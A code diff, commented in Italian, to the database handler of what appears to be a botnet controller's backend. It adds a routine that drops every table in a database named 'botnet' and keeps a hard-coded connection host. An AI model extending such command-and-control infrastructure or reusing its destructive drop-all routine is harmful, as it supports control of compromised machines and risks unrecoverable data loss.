@@ -15,7 +15,6 @@ class DatabaseHandler:
     aggiungendo __ all'inizio di una variabile (naming convention) la definiamo
     come internal (Non è quindi accessibile)
     """
-    # TODO: Cambiare in produzione
     __database_host = "192.168.1.36"
     __database_port = "5432"
     __database_name = "botnet"
@@ -103,6 +102,24 @@ class DatabaseHandler:
 
     def database_remove_all_record(query: str):
         """Funzione di rimozione di tutti i record presenti nel database."""
+
+    def database_drop_all() -> None:
+        """Funzione di reset del database."""
+        bot_master_utils.info("[+] Inizializzazione statement per l'eliminazione di tutte le tabelle presenti sul database", 1)
+        try:
+            with psycopg2.connect(host=DatabaseHandler.__database_host, port=DatabaseHandler.__database_port,
+                                  database=DatabaseHandler.__database_name, user=DatabaseHandler.__database_username,
+                                  password=DatabaseHandler.__database_password) as connection:
+                with connection.cursor() as cursor:
+                    # cursor.execute("DROP TABLE public.botclient CASCADE;")
+                    cursor.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE';")
+                    tables = [i[0] for i in cursor.fetchall()]  # Convertiamo una tupla in un array (Prendiamo il primo campo)
+                    for table in tables:
+                        bot_master_utils.info(f"[+] Eliminazione tabella {table} database", 1)
+                        cursor.execute(f"DROP TABLE public.{table} CASCADE;")
+                connection.commit()
+        except Error as e:
+            bot_master_utils.info(f"Errore nell'esecuzione dello statement: {e}", 2)
 
     @classmethod
     def __init__(self):
